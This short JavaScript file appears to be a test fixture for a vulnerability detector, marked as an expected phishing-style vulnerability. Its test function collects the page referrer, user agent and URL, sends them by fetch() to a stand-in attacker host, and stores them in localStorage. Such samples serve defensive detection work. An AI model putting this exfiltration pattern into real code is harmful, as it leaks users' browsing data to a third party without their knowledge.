/**
 * Test: Real-world phishing scenario
 * Expected: VULNERABILITY - multiple sources creating realistic phishing attack
 */

function test() {
  var referrer = document.referrer;
  var userAgent = navigator.userAgent;
  var currentUrl = window.location.href;
  
  var phishingData = {
    ref: referrer,
    ua: userAgent,
    url: currentUrl,
    timestamp: Date.now()
  };
  
  // Exfiltrate to attacker server
  fetch('https://phishing.evil.com/collect', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(phishingData)
  });
  
  // Also store locally for persistence
  localStorage.setItem('tracking', JSON.stringify(phishingData));
}

test();